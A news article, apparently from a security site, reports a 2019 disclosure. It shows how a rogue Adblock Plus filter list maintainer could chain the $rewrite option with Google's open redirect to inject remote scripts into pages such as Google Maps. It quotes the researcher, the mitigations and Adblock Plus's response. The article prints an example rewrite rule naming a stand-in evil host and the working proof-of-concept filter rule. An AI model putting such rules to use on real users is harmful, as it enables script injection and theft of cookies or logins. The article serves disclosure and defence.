@@ -1,0 +1,229 @@
+
+	   
+
+
+An exploit has been discovered that could allow ad blocking filter list maintainers for the Adblock Plus, AdBlock, and uBlocker browser extensions to create filters that inject remote scripts into web sites.
+
+With ad blockers having a a user base of over 10 million installs, if malicious scripts were injected it would have a huge impact as they could perform unwanted activity such as stealing cookies, login credentials, causing page redirects, or other unwanted behavior.
+
+The $rewrite filter option
+
+For those who are unfamiliar with how ad blockers work, they utilize lists of URLs related to advertisements and malicious behavior and are typically maintained by a small team of people or even a single person. When these lists are loaded by an ad blocking extension, like Adblock Plus, the extension will prevent the browser from connecting to the listed URLs and thus advertisements or malicious scripts are unable to load.
+
+
+1/1
+
+
+
+
+
+Skip Ad
+ 
+Continue watchingafter the adVisit Advertiser websiteGO TO PAGE.cnx-non-linear-ad-container .cnx-ad-bid-slot{position:absolute;top:0;left:0;grid-area:adslot;opacity:0;background:none;width:100%;height:100%}.cnx-non-linear-ad-container .cnx-ad-bid-slot.cnx-ad-bid-slot-selected{opacity:1;z-index:10}.cnx-non-linear-ad-container .cnx-ad-slot{display:flex;position:absolute;top:0;left:0;justify-content:center;align-items:center;width:100%;height:100%;overflow:hidden}.cnx-non-linear-ad-container .cnx-ad-slot video,.cnx-non-linear-ad-container video.cnx-ad-slot{background-color:unset}.cnx-ad-container .cnx-ad-bid-slot{position:absolute;top:0;left:0;grid-area:adslot;opacity:0;background:#f4f4f4;width:100%;height:100%}.cnx-ad-container .cnx-ad-bid-slot.cnx-ad-bid-slot-selected{opacity:1;z-index:10}.cnx-ad-container .cnx-ad-slot{display:flex;position:absolute;top:0;left:0;justify-content:center;align-items:center;width:100%;height:100%;overflow:hidden}.cnx-ad-container .cnx-ad-slot div{background-color:rgba(0,0,0,0) !important}.cnx-ad-container .cnx-ad-slot iframe{box-sizing:border-box;border:3px solid #fff !important;color-scheme:none}.cnx-ad-container .cnx-ad-slot iframe:not([id]){border:none !important}.cnx-ad-container .cnx-ad-slot-video-type iframe{border:none !important}.cnx-ad-container .cnx-ad-slot video,.cnx-ad-container video.cnx-ad-slot{background-color:#f4f4f4}For example, below is the filter list for the popular ad blocking list called EasyList.
+
+
+EasyList Filter List
+
+When Adblocker Plus 3.2 was released in 2018, a new filter list option was added called $rewrite. This option allowed a list maintainer to replace a web request that matches a particular regular expression with another URL. 
+
+The only caveat is that the replacement string must be a relative URL, which means it does not contain a hostname, and when rewritten must be in the same origin domain as the original request.
+
+For example, the following filter rule will cause all requests for example.com/ad.gif to be replaced with example.com/puppies.gif. So instead of ads being displayed on a page, you will see cute pictures of puppies.
+
+||example.com/ad.gif$rewrite=/puppies.gif
+
+On the other hand, as the rewritten URL has to be on the same origin as the original URL and must be a relative URL, the following $rewrite rule will not work.
+
+||example.com/ads.js$rewrite=https://evilsite.tk/bwahaha.js
+
+
+To make $rewrite even more difficult to exploit, this filter option will not work against requests of the type SCRIPT, SUBDOCUMENT, OBJECT and OBJECT_SUBREQUEST.
+
+So if a malicious script has to be on the same site, has to be rewritten to a relative URL, and can't be loaded via a script tag, how can a list maintainer exploit it?
+
+Chaining $rewrite with web service redirects for an exploit
+
+Today security researcher Armin Sebastian explained that under certain conditions it is possible for a rogue ad blocker filter maintainer to create a rule that injects a remote script into a particular site.
+
+To do this, you would need to find a site that allows scripts to load from any domain, contains an open redirect, and uses XMLHttpRequest or Fetch to download scripts that will be executed.  This was not too difficult to find, as Sebastian utilized Google Maps for his Proof of Concept.
+
+
+The following criteria must be met for a web service to be exploitable using this method:
+
+The page must load a JS string using XMLHttpRequest or Fetch and execute the returned code
+	The page must not restrict origins from which it can fetch using Content Security Policy directives, or it must not validate the final request URL before executing the downloaded code
+	The origin of the fetched code must have a server-side open redirect or it must host arbitrary user content
+
+
+The two keys to the puzzle is the use of XMLHttpRequest or Fetch to download scripts and an open redirect.
+
+This is because requests using XMLHttpRequest or Fetch to download remote scripts for execution will not fail when using the $rewrite option. Furthermore, the open redirect is equally as important because it allows for the reading of the script by XMLHttpRequest from a remote site, while still appearing to be in the same origin.
+
+As an example, Sebastian utilized Google Maps, which utilizes XMLHttpRequest to load scripts and because google.com has an open redirect as part of the search results pages.  This allowed him to chain an exploit together using the $rewrite filter option along with the open redirect to read a remote script as shown below.
+
+/^https://www.google.com/maps/_/js/k=.*/m=pw/.*/rs=.*/$rewrite=/search?hl=en-US&source=hp&biw=&bih=&q=majestic-ramsons.herokuapp.com&btnI=I%27m+Feeling+Lucky&gbv=1
+
+With the above rule in place, when you visit www.google.com/maps/, the filter rule will use Google's open redirect to read the contents of from https://majestic-ramsons.herokuapp.com/. 
+
+
+Remote Script
+
+As the open redirect url is in the same origin, or domain, the strings will be allowed to be read and executed as JavaScript, which will cause the alert to be shown as seen below.
+
+
+Remote script showing an alert
+
+Sebastian has reported this to Google, but their stance has always been that the open redirect is "Intended behavior".
+
+"Google has been notified about the exploit, but the report was closed as “Intended Behavior”, since they consider the potential security issue to be present solely in the mentioned browser extensions. This is an unfortunate conclusion, because the exploit is composed of a set of browser extension and web service vulnerabilities that have been chained together."
+
+In order to mitigate this chained exploit, Sebastian recommends that web sites utilize the Content Security Policy header and the connect-src option to specify a whitelist of sites that scripts can be loaded from.
+
+"The exploit can be mitigated in the affected web services by whitelisting known origins using the connect-src CSP header, or by eliminating server-side open redirects."
+
+This exploit will not work with uBlock Origin as it does not support the $rewrite filter option.
+
+Why would a filter maintainer go rogue?
+
+While there may numerous ways to modify a filter list, Sebastian told BleepingComputer his main concern is a "filter list operators that may perform targeted attacks that are difficult to detect".
+
+As many filter list maintainers are volunteers, it's conceivable that they would add an unwanted filter for numerous reasons.
+
+For example, Sebastian explains that in 2018 a list maintainer added a filter for political reasons that blocked various union web sites in Finland that were conducting protests.
+
+It should also be noted that while the extensions come with only a few filter lists, there are many more maintained by third-parties that can be added.  It would not be surprising to find that a popular list is purchased and then modified to include malicious filters or for a maintainer to be enticed by money to make a temporary change and revert back before anyone notices.
+
+Update 4/16/19 9:24 AM EST: Added that this exploit would not affect uBlock Origin and a portion of AdBlock Plus' statement is below:
+
+"It is our responsibility to protect our users, and despite the actual risk being very low, we have decided to remove the rewrite option and will accordingly release an updated version of Adblock Plus as soon as technically possible.We are doing this as a measure of precaution. There has not been any attempt of abusing the rewrite option and we will do everything we can to ensure this won’t happen."
+
+ 
+
+	   
+
+.ia_ad {
+    background-color: #f0f6ff;
+    width: 95%;
+    max-width: 800px;
+    margin: 15px auto;
+    border-radius: 8px;
+    border: 1px solid #d6ddee;
+    display: flex;
+    align-items: stretch;
+    padding: 0;
+    overflow: hidden;
+}
+
+.ia_lef {
+    flex: 1;
+    max-width: 200px;
+    height: auto;
+    display: flex;
+    align-items: stretch;
+}
+
+.ia_lef a {
+    display: flex;
+    width: 100%;
+    height: 100%;
+}
+
+
+.ia_lef a img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    border-radius: 8px 0 0 8px;
+    margin: 0;
+    display: block;
+}
+
+.ia_rig {
+    flex: 2;
+    padding: 10px;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+}
+
+.ia_rig h2 {
+    font-size: 17px !important;
+    font-weight: 700;
+    color: #333;
+    line-height: 1.4;
+    font-family: Georgia, "Times New Roman", Times, serif;
+    margin: 0 0 14px 0;
+}
+
+.ia_rig p {
+    font-weight: bold;
+    font-size: 14px;
+    margin: 0 0 clamp(6px, 2vw, 14px) 0;
+}
+
+.ia_button {
+    background-color: #FFF;
+    border: 1px solid #3b59aa;
+    color: black;
+    text-align: center;
+    text-decoration: none;
+    border-radius: 8px;
+    display: inline-block;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+    padding: 10px 20px;
+    width: fit-content;
+}
+
+.ia_button a {
+    text-decoration: none;
+    color: inherit;
+    display: block;
+}
+
+@media (max-width: 600px) {
+    .ia_ad {
+        flex-direction: column;
+        align-items: center;
+    }
+
+    .ia_lef {
+        max-width: 100%;
+    }
+
+    .ia_lef a img {
+        border-radius: 8px 8px 0 0;
+    }
+
+
+    .ia_rig {
+        padding: 15px;
+        width: 100%;
+    }
+
+    .ia_button {
+        width: 100%;
+	margin: 0px auto;
+    }
+}
+
+    
+        
+            
+    
+    
+        Red Report 2025: Analyzing the Top ATT&CK Techniques Used by 93% of Malware 
+Malware targeting password stores surged 3X as attackers executed stealthy Perfect Heist scenarios, infiltrating and exploiting critical systems.
+Discover the top 10 MITRE ATT&CK techniques behind 93% of attacks and how to defend against them.
+        Read the Red Report 2025
+    
+
+
+           
+          
+            Related Articles:
+	     Block annoying ads on nine devices forever in this $16 AdGuard dealGet AdGuard’s lifetime ad blocker for $16 with our coupon dealAdGuard’s lifetime ad blocker protect is now $16 in this dealSave hundreds on a two-part digital AdGuard security suite for families
+	  
+ 
+	  
